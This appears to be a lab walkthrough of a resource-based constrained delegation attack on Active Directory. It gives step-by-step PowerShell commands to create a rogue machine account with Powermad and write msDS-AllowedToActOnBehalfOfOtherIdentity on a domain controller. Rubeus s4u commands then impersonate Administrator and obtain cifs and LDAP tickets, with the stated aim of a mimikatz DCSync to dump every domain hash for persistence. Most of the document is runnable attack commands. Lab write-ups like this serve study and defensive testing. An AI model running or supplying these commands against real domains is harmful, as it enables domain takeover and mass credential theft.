# Resource Based Constrained Delegation

## Lab Setup

⇒ So for us to perform resource based constrained delegation attack a **`user/machine`** must have **`GenericWrite`** to another machine . So we will be setting GenericWrite on vDC01 for the user Naqi using ADUC [ Active Directory Users and Computer ] :

![Resource%20Based%20Constrained%20Delegation/Untitled.png](Resource%20Based%20Constrained%20Delegation/Untitled.png)

![Resource%20Based%20Constrained%20Delegation/Untitled%201.png](Resource%20Based%20Constrained%20Delegation/Untitled%201.png)

---

## Performing the Attack

⇒ So for a person to perform this attack he/she must have **`Write`** on **`msDS-AllowedToActOnBehalfOfOtherIdentity`** attribute to a machine.

- So first we will create a new computer object **`ENOX01`** in Active Directory using PowerMad
- Then we leverage **`WRITE`** privilege on the **`vDC01`** computer object and update **`msDS-AllowedToActOnBehalfOfOtherIdentity`** attribute to contain a security descriptor of **`ENOX01`** machine.
    - In simple terms this means **`vDC01`** will allow the computer resource **`ENOX01`** to impersonate any domain user if they want to access any service on **`vDC01`**
- We use Rubeus **s4u** extension to impersonate as **Administrator** user and request an ticket to **cifs** service.
- Then finally we impersonate **Administrator** user and request **LDAP** Service ticket to perform **DCSync** attack using **mimikatz**.

---

### i) Creating Computer Object

- So first we will be creating computer object named ENOX01 using [Powermad](https://github.com/Kevin-Robertson/Powermad) and note the SID

```powershell
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount ENOX01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

![Resource%20Based%20Constrained%20Delegation/Untitled%202.png](Resource%20Based%20Constrained%20Delegation/Untitled%202.png)

![Resource%20Based%20Constrained%20Delegation/Untitled%203.png](Resource%20Based%20Constrained%20Delegation/Untitled%203.png)

SID : **`S-1-5-21-1710056623-765944083-1957563412-1117`**

---

### ii) Setting **msDS-AllowedToActOnBehalfOfOtherIdentity attribute**

- Next we will be getting the Security Descriptor of **`ENOX01`** and set **`msds-allowedtoactonbehalfofotheridentity`** attribute for **`vDC01`**

```powershell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1710056623-765944083-1957563412-1117)"

$SDBytes = New-Object byte[] ($SD.BinaryLength)

$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer vDC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

![Resource%20Based%20Constrained%20Delegation/Untitled%204.png](Resource%20Based%20Constrained%20Delegation/Untitled%204.png)

- Lets confirm we have set it using the following powershell command :

```powershell
Get-NetComputer vDC01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
```

![Resource%20Based%20Constrained%20Delegation/Untitled%205.png](Resource%20Based%20Constrained%20Delegation/Untitled%205.png)

---

### iii) Getting Tickets and dumping hashes

⇒ So first we will get rc4 hash of the ENOX01 machine password using [Rubeus](https://github.com/GhostPack/Rubeus) :

```powershell
.\Rubeus.exe hash /password:123456 /user:ENOX01 /domain:endark.local
```

![Resource%20Based%20Constrained%20Delegation/Untitled%206.png](Resource%20Based%20Constrained%20Delegation/Untitled%206.png)

`32ED87BDB5FDC5E9CBA88547376818D4`

⇒ Now we will impersonate as Administrator user using **`s4u`** extension in **Rubeus** and request ticket to **`cifs`** service :

```powershell
.\Rubeus.exe s4u /user:ENOX01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:Administrator /msdsspn:cifs/vdc01.endark.local /outfile:dc.kirbi /ptt
```

![Resource%20Based%20Constrained%20Delegation/Untitled%207.png](Resource%20Based%20Constrained%20Delegation/Untitled%207.png)

![Resource%20Based%20Constrained%20Delegation/Untitled%208.png](Resource%20Based%20Constrained%20Delegation/Untitled%208.png)

⇒ We will now request an ticket to **`ldap`** service instead so we can perform [dcsync attack](https://endark.gitbook.io/kb/windows/lab-attacks/using-dcsync-attack-to-steal-user-hashes-in-a-domain) using [mimikatz](https://github.com/gentilkiwi/mimikatz) and retrieve all the hashes in the domain for persistence :

```powershell
.\Rubeus.exe s4u /user:ENOX01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:Administrator /msdsspn:ldap/vdc01.endark.local /outfile:ldap.kirbi
```

![Resource%20Based%20Constrained%20Delegation/Untitled%209.png](Resource%20Based%20Constrained%20Delegation/Untitled%209.png)

![Resource%20Based%20Constrained%20Delegation/Untitled%2010.png](Resource%20Based%20Constrained%20Delegation/Untitled%2010.png)

---